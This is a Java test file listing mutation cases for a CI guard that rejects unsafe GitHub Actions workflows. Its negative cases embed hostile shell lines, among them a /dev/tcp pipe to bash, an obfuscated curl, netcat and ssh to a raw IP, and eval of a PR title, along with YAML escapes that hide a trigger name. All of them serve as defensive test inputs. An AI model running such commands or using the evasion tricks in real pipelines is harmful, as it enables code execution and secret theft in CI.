package com.beautica.ci;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.function.UnaryOperator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

/**
 * Mutation cases for {@link PullRequestTargetGuardChecker}, ported from the mobile guard's --self-test.
 * Each case mutates the real promotion-source.yml (or supplies another workflow file) and names the specific
 * failure reason the checker must report. A mutation that no longer applies to the file fails loudly, so a
 * case can never go vacuous after an edit of the workflow.
 */
final class PullRequestTargetGuardCases {

    /** One negative case: files written to a temp workflows dir, then checked; output must contain needle. */
    record Case(String name, UnaryOperator<String> guard, Map<String, String> files, boolean pinned, String needle) {
        @Override
        public String toString() {
            return name;
        }
    }

    static final String DEFAULT_OTHER =
        "on:\n  pull_request:\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@v4\n";

    private static final String RUN_ANCHOR = "          set -euo pipefail\n";
    private static final String TITLE_EXPR = "${{ github.event.pull_request.title }}";

    private PullRequestTargetGuardCases() {
    }

    // ---- mutation helpers -------------------------------------------------------------------------------

    static UnaryOperator<String> lit(String from, String to) {
        return t -> {
            int i = t.indexOf(from);
            if (i < 0) {
                throw new AssertionError("mutation target not found (case went vacuous): " + from);
            }
            return t.substring(0, i) + to + t.substring(i + from.length());
        };
    }

    /** Replaces the first match of a multiline regex with a literal string. */
    static UnaryOperator<String> rx(String regex, String to) {
        return t -> {
            Matcher m = Pattern.compile(regex, Pattern.MULTILINE).matcher(t);
            if (!m.find()) {
                throw new AssertionError("mutation target not found (case went vacuous): " + regex);
            }
            return t.substring(0, m.start()) + to + t.substring(m.end());
        };
    }

    static UnaryOperator<String> then(UnaryOperator<String> first, UnaryOperator<String> second) {
        return t -> second.apply(first.apply(t));
    }

    /** Inserts a line right after {@code set -euo pipefail} inside the run body. */
    static UnaryOperator<String> ins(String line) {
        return lit(RUN_ANCHOR, RUN_ANCHOR + line + "\n");
    }

    private static final String BASE_REPO_LINE = "          BASE_REPO: ${{ github.repository }}";

    static UnaryOperator<String> after(String anchor, String line) {
        return lit(anchor, anchor + "\n" + line);
    }

    // ---- case factories ---------------------------------------------------------------------------------

    private static Case g(String name, UnaryOperator<String> m, String needle) {
        return new Case(name, m, Map.of("other.yml", DEFAULT_OTHER), false, needle);
    }

    private static Case pinned(String name, UnaryOperator<String> m, String needle) {
        return new Case(name, m, Map.of("other.yml", DEFAULT_OTHER), true, needle);
    }

    private static Case other(String name, String yaml, String needle) {
        return new Case(name, UnaryOperator.identity(), Map.of("other.yml", yaml), false, needle);
    }

    private static Case extra(String name, String file, String yaml, String needle) {
        return new Case(name, UnaryOperator.identity(), Map.of("other.yml", DEFAULT_OTHER, file, yaml), false, needle);
    }

    private static Case denied(String name, String on, String trigger) {
        return other(name, on, "uses privileged trigger '" + trigger + "'");
    }

    private static final String SECOND_JOB_PERMS =
        "  second:\n    runs-on: ubuntu-latest\n    permissions: write-all\n    steps:\n      - run: echo hi\n";
    private static final String SECOND_JOB_NONE =
        "  second:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";

    static List<Case> negativeCases() {
        List<Case> c = new ArrayList<>();

        // original cases
        c.add(other("other_uses_prt", DEFAULT_OTHER + "  # comment ok\non:\n  pull_request_target:\n",
            "other.yml: uses pull_request_target (only promotion-source.yml may)"));
        c.add(g("no_edited", lit("[opened, edited, ", "[opened, "), "types including 'edited'"));
        c.add(g("has_checkout", lit("    steps:\n", "    steps:\n      - uses: actions/checkout@v4\n"),
            "step 1 has forbidden keys [uses]"));
        c.add(g("no_wf_perms", rx("^permissions: \\{\\}$", "permissions: read-all"),
            "workflow-level 'permissions: {}' missing"));
        c.add(g("no_job_perms", rx("^    permissions: \\{\\}$", "    permissions: read-all"),
            "'permissions' must be exactly {}"));
        c.add(g("expr_in_run", ins("          echo \"" + TITLE_EXPR + "\""),
            "run string contains the expression opener"));
        c.add(g("loose_name", rx("^    name: Promotion source .*$", "    name: Promotion source"),
            "name must be exactly"));
        c.add(new Case("missing", UnaryOperator.identity(), Map.of("other.yml", "on: push\n"), false,
            "promotion-source.yml: missing (the guard workflow must exist)"));

        // trigger name hidden from grep
        c.add(other("esc_hex", "on:\n  \"pull_request_\\x74arget\":\n", "double-quoted scalar with"));
        c.add(other("esc_unicode", "on:\n  \"pull\\u005Frequest_target\":\n", "double-quoted scalar with"));
        c.add(other("esc_unicode_upper", "on:\n  \"pull\\U0000005Frequest_target\":\n", "double-quoted scalar with"));
        c.add(other("esc_continuation", "on: [\"pull_request_\\\n  target\"]\n", "double-quoted scalar with"));
        c.add(other("esc_continuation_trailing_space", "on: [\"pull_request_\\ \n  target\"]\n",
            "double-quoted scalar with"));
        c.add(other("double_quoted_plain_key", "on:\n  \"pull_request_target\":\n",
            "other.yml: uses pull_request_target (only promotion-source.yml may)"));
        c.add(other("single_quoted_key", "on:\n  'pull_request_target':\n", "uses pull_request_target (only"));
        c.add(other("flow_list", "on: [pull_request_target]\njobs: {}\n", "uses pull_request_target (only"));
        c.add(other("flow_map", "on: {pull_request_target: {types: [opened]}}\n", "uses pull_request_target (only"));
        c.add(other("on_string", "on: pull_request_target\n", "uses pull_request_target (only"));
        c.add(other("on_string_uppercase", "on: PULL_REQUEST_TARGET\n", "uses pull_request_target (only"));
        c.add(extra("on_string_yaml_ext", "x.yaml", "on: pull_request_target\n", "x.yaml: uses pull_request_target"));
        c.add(other("quoted_on_key", "\"on\": [pull_request_target]\n", "uses pull_request_target (only"));
        c.add(other("bool_true_key", "true:\n  pull_request_target:\n", "uses pull_request_target (only"));
        c.add(other("bool_yes_key", "yes:\n  pull_request_target:\n", "uses pull_request_target (only"));
        c.add(other("on_two_keys", "\"on\": push\non: [pull_request_target]\n", "expected exactly one 'on' key, found 2"));
        c.add(other("on_missing", "name: x\njobs: {}\n", "expected exactly one 'on' key, found 0"));
        c.add(other("on_scalar_int", "on: 5\n", "'on' is neither string, list nor map"));
        c.add(other("root_not_mapping", "- on\n- push\n", "workflow root is not a mapping"));
        c.add(other("empty_document", "", "expected exactly one YAML document"));
        c.add(other("multi_document", "on: push\n---\non: [pull_request_target]\n", "expected exactly one YAML document"));
        c.add(g("multi_document_guard", t -> t + "---\non: push\n", "expected exactly one YAML document"));
        c.add(other("dup_key", "on:\n  push:\n  push:\n", "duplicate key"));
        c.add(other("dup_key_nested_prt", "on:\n  pull_request_target:\n    types: [a]\n    types: [b]\n", "duplicate key"));
        c.add(other("unparseable", "on: [push\n  : : :\n", "unparseable YAML, failing closed"));
        c.add(other("benign_escape_still_rejected", "on: push\nenv:\n  X: \"tab\\u0009here\"\n",
            "double-quoted scalar with"));
        c.add(other("null_tag_denied", "on:\n  !!null workflow_run:\n    workflows: [x]\n", "non-string trigger (null)"));
        c.add(other("bool_tag_denied", "on:\n  !!bool issue_comment:\n", "non-string trigger"));
        c.add(other("null_tag_list", "on: [push, !!null workflow_run]\n", "non-string trigger (null)"));
        c.add(other("verbatim_null_tag", "!<tag:yaml.org,2002:null> on: x\non: push\n", "non-string top-level key (null)"));
        c.add(g("raw_split_unicode_breaks", t -> "# a\u2028# b\u0085# c\n# " + TITLE_EXPR + "\n" + t,
            "line 4: expression opener outside the 7 allowed literal lines"));
        c.add(g("prt_not_only_trigger", rx("^on:$", "on:\n  push:"), "must contain ONLY pull_request_target"));

        // other privileged triggers in ANY workflow
        c.add(denied("workflow_run", "on:\n  workflow_run:\n    workflows: [x]\n", "workflow_run"));
        c.add(denied("workflow_run_list", "on: [push, workflow_run]\n", "workflow_run"));
        c.add(denied("issue_comment", "on:\n  issue_comment:\n    types: [created]\n", "issue_comment"));
        c.add(denied("pr_review_comment", "on: pull_request_review_comment\n", "pull_request_review_comment"));
        c.add(denied("pr_review", "on: [pull_request_review]\n", "pull_request_review"));
        c.add(g("guard_has_workflow_run", rx("^on:$", "on:\n  workflow_run:\n    workflows: [x]"),
            "uses privileged trigger 'workflow_run'"));
        c.add(denied("issues", "on:\n  issues:\n    types: [opened]\n", "issues"));
        c.add(denied("issues_uppercase", "on: ISSUES\n", "issues"));
        c.add(denied("discussion", "on: discussion\n", "discussion"));
        c.add(denied("discussion_comment", "on: [discussion_comment]\n", "discussion_comment"));
        c.add(denied("gollum", "on: gollum\n", "gollum"));
        c.add(denied("denied_in_quoted_on_key", "\"on\":\n  gollum:\n", "gollum"));

        // expression opener outside the allowed literal lines
        c.add(g("expr_folded", then(rx("^        run: \\|$", "        run: >"), ins("          echo \"" + TITLE_EXPR + "\"")),
            "run string contains the expression opener"));
        c.add(g("expr_strip", then(rx("^        run: \\|$", "        run: |-"), ins("          echo \"" + TITLE_EXPR + "\"")),
            "run string contains the expression opener"));
        c.add(g("expr_single_line", lit("    steps:\n", "    steps:\n      - run: echo \"" + TITLE_EXPR + "\"\n"),
            "run string contains the expression opener"));
        c.add(g("expr_in_comment_in_run", ins("          # ${{ github.event.pull_request.body }}"),
            "expression opener outside the 7 allowed literal lines"));
        c.add(g("expr_in_header_comment", t -> "# " + TITLE_EXPR + "\n" + t,
            "line 1: expression opener outside the 7 allowed literal lines"));
        c.add(g("expr_env_nongithub", rx("^          BASE_REPO: .*$", "          BASE_REPO: ${{ env.X }}"),
            "expression opener outside the 7 allowed literal lines"));
        c.add(g("expr_env_lowercase", rx("^          BASE_REPO: .*$", "          base_repo: ${{ github.repository }}"),
            "env must equal exactly"));
        c.add(g("envshape_in_run", ins("          FOO: " + TITLE_EXPR), "run string contains the expression opener"));

        // permissions: every line exactly `permissions: {}`, workflow + every job
        c.add(g("perms_write_all_line", after("    timeout-minutes: 5", "    permissions: write-all"), "duplicate key"));
        c.add(g("perms_job_map", rx("^    permissions: \\{\\}$", "    permissions:\n      contents: read"),
            "job 'promotion-source': 'permissions' must be exactly {}"));
        c.add(g("perms_job_missing", rx("^    permissions: \\{\\}\\n", ""), "'permissions' must be exactly {}"));
        c.add(g("perms_wf_missing", rx("^permissions: \\{\\}\\n", ""), "workflow-level 'permissions: {}' missing"));
        c.add(g("perms_quoted_key", rx("^    permissions: \\{\\}$", "    \"permissions\": read-all"),
            "every permissions: line must be exactly"));
        c.add(g("perms_trailing_comment", rx("^permissions: \\{\\}$", "permissions: {}  # c"),
            "every permissions: line must be exactly"));
        c.add(g("perms_wf_nonempty_flow", rx("^permissions: \\{\\}$", "permissions: { contents: read }"),
            "workflow-level 'permissions: {}' missing"));
        c.add(g("perms_second_job", t -> t + SECOND_JOB_PERMS, "job 'second': 'permissions' must be exactly {}"));
        c.add(g("perms_second_job_none", t -> t + SECOND_JOB_NONE, "job 'second': 'permissions' must be exactly {}"));

        // no way to fetch / run PR code: structure + run-body deny-list
        c.add(g("run_git_clone", ins("          git clone \"https://github.com/$HEAD_REPO\" x && bash x/run.sh"), "near 'git'"));
        c.add(g("run_curl", ins("          curl -s \"$HEAD_REPO\""), "near 'curl'"));
        c.add(g("run_wget", ins("          wget \"$HEAD_REPO\""), "near 'wget'"));
        c.add(g("run_gh", ins("          gh pr checkout 1"), "near 'gh'"));
        c.add(g("run_docker", ins("          docker run x"), "near 'docker'"));
        c.add(g("run_npm", ins("          npm ci"), "near 'npm'"));
        c.add(g("run_npx", ins("          npx x"), "near 'npx'"));
        c.add(g("run_pip", ins("          pip install x"), "near 'pip'"));
        c.add(g("run_source", ins("          source ./x.sh"), "near 'source ."));
        c.add(g("run_dot_source", ins("          . ./x.sh"), "near '. .'"));
        c.add(g("run_bash_file", ins("          bash x.sh"), "near 'bash x'"));
        c.add(g("run_eval", ins("          eval \"$PR_TITLE\""), "near 'eval'"));
        c.add(g("run_exec", ins("          exec x"), "near 'exec'"));
        c.add(g("run_secrets", ins("          echo secrets"), "near 'secrets'"));
        c.add(g("run_pull_path", ins("          echo refs/pull/1/head"), "near 'pull/'"));
        c.add(g("run_secrets_env", after(BASE_REPO_LINE, "          TOK: ${{ secrets.BEAUTICA_KEYSTORE_PASSWORD }}"),
            "env must equal exactly"));
        c.add(g("step_uses", lit("      - name: Check PR source", "      - uses: actions/cache@v4\n        with:\n          path: x\n      - name: Check PR source"),
            "step 1 has forbidden keys [uses, with]"));
        c.add(g("step_with_only", lit("        env:\n", "        with:\n          a: b\n        env:\n"),
            "step 1 has forbidden keys [with]"));
        c.add(g("step_shell_key", lit("        env:\n", "        shell: bash\n        env:\n"),
            "step 1 has forbidden keys [shell]"));
        c.add(g("job_container", after("    timeout-minutes: 5", "    container: ubuntu"), "has forbidden keys [container]"));
        c.add(g("job_services", after("    timeout-minutes: 5", "    services: {}"), "has forbidden keys [services]"));
        c.add(g("job_uses_reusable", after("    timeout-minutes: 5", "    uses: ./.github/workflows/x.yml"),
            "has forbidden keys [uses]"));
        c.add(g("job_needs", after("    timeout-minutes: 5", "    needs: x"), "has forbidden keys [needs]"));
        c.add(g("job_if", after("    timeout-minutes: 5", "    if: true"), "has forbidden keys [if]"));
        c.add(g("job_env", after("    timeout-minutes: 5", "    env: {A: b}"), "has forbidden keys [env]"));
        c.add(g("top_level_env", t -> t + "env:\n  A: b\n", "unexpected top-level keys [env]"));
        c.add(g("top_level_defaults", rx("^permissions: \\{\\}$", "permissions: {}\ndefaults: {}"),
            "unexpected top-level keys [defaults]"));
        c.add(g("run_not_string", rx("^        run: \\|$", "        run: 5\n        x: |"), "forbidden keys [x]"));

        // pin
        c.add(pinned("hash_mismatch", t -> t + "\n",
            "promotion-source.yml changed; review it and update the pinned hash in CiInfraCoverageTest in the same PR"));
        c.add(pinned("hash_mismatch_byte", lit("timeout-minutes: 5", "timeout-minutes: 6"),
            "update the pinned hash in CiInfraCoverageTest in the same PR"));
        c.add(pinned("hash_mismatch_crlf", t -> t.replace("\n", "\r\n"), "update the pinned hash"));
        c.add(pinned("hash_mismatch_comment_only", lit("# Phase 370 D5", "# Phase 370 D6"), "update the pinned hash"));
        c.add(pinned("hash_mismatch_trailing_space", lit("permissions: {}\n", "permissions: {} \n"), "update the pinned hash"));

        // audit cycle 2: run-body primitives, runs-on, env, name, group, extension case
        c.add(g("py_fetch", ins("          python3 -c \"import urllib.request as u\"; python3 /tmp/x"), "near 'python3'"));
        c.add(g("perl_fetch", ins("          perl -MLWP::Simple -e 1; perl /tmp/a"), "near 'perl'"));
        c.add(g("devtcp", ins("          cat </dev/tcp/1.2.3.4/80 | bash"), "near '/dev/tcp'"));
        c.add(g("cmdsub_curl", ins("          c=cu; $(echo ${c}rl) -s https://e.x"), "near '$('"));
        c.add(g("cmdsub_only", ins("          x=$(date)"), "near '$('"));
        c.add(g("backtick", ins("          x=`date`"), "near '`'"));
        c.add(g("pipe_sh", ins("          printf x | sh"), "near '| sh'"));
        c.add(g("run_ruby", ins("          ruby -e 1"), "near 'ruby'"));
        c.add(g("run_node", ins("          node -e 1"), "near 'node'"));
        c.add(g("run_php", ins("          php -r 1"), "near 'php'"));
        c.add(g("self_hosted", lit("    runs-on: ubuntu-latest", "    runs-on: self-hosted"),
            "runs-on must be exactly 'ubuntu-latest'"));
        c.add(g("runs_on_list", lit("    runs-on: ubuntu-latest", "    runs-on: [ubuntu-latest]"),
            "runs-on must be exactly 'ubuntu-latest'"));
        c.add(g("github_token_env", after(BASE_REPO_LINE, "          T: ${{ github.token }}"), "env must equal exactly"));
        c.add(g("env_value_swapped", rx("^          BASE_REPO: .*$", "          BASE_REPO: ${{ github.token }}"),
            "env must equal exactly"));
        c.add(g("env_literal_added", after(BASE_REPO_LINE, "          X: literal"), "env must equal exactly"));
        c.add(g("env_removed", rx("^          BASE_REPO: .*\\n", ""), "env must equal exactly"));
        c.add(g("env_missing", rx("^        env:\\n(          [A-Z_]+: .*\\n)+", ""), "env must equal exactly"));
        c.add(g("name_wrong", rx("^    name: Promotion source .*$",
            "    name: Promotion source (${{ github.event.pull_request.head.ref }})"), "name must be exactly"));
        c.add(g("group_wrong", rx("^  group: .*$", "  group: promotion-source-" + TITLE_EXPR),
            "concurrency.group must be exactly"));
        c.add(g("group_missing", rx("(?s)^concurrency:\\n.*?cancel-in-progress: true\\n", ""),
            "concurrency must be a mapping"));
        c.add(g("concurrency_extra_key", after("  cancel-in-progress: true", "  x: y"),
            "concurrency must be a mapping of group / cancel-in-progress only"));
        c.add(extra("upper_yml", "x.YML", "on: pull_request_target\n", "x.YML: uses pull_request_target"));
        c.add(extra("upper_yaml_mixed", "y.Yaml", "on: [pull_request_target]\n", "y.Yaml: uses pull_request_target"));
        c.add(g("run_nc", ins("          nc 1.2.3.4 80"), "near 'nc'"));
        c.add(g("run_ncat", ins("          ncat 1.2.3.4 80"), "near 'ncat'"));
        c.add(g("run_openssl", ins("          openssl s_client -connect 1.2.3.4:443"), "near 'openssl'"));
        c.add(g("run_inet", ins("          awk 1 /inet/tcp/0/1.2.3.4/80"), "near '/inet/'"));
        c.add(g("run_ssh", ins("          ssh root@1.2.3.4"), "near 'ssh'"));
        c.add(g("run_zsh_file", ins("          zsh x.sh"), "near 'zsh x'"));
        c.add(g("jobs_empty", rx("(?s)^jobs:\\n.*\\z", "jobs: {}\n"), "jobs must be a non-empty mapping"));
        c.add(g("steps_empty", rx("(?s)^    steps:\\n.*\\z", "    steps: []\n"), "steps must be a non-empty list"));
        c.add(g("no_job_named", rx("^    name: Promotion source .*$", "    name: x"), "no job with name exactly"));
        return c;
    }

    static Stream<Case> negativeCaseStream() {
        return negativeCases().stream();
    }
}
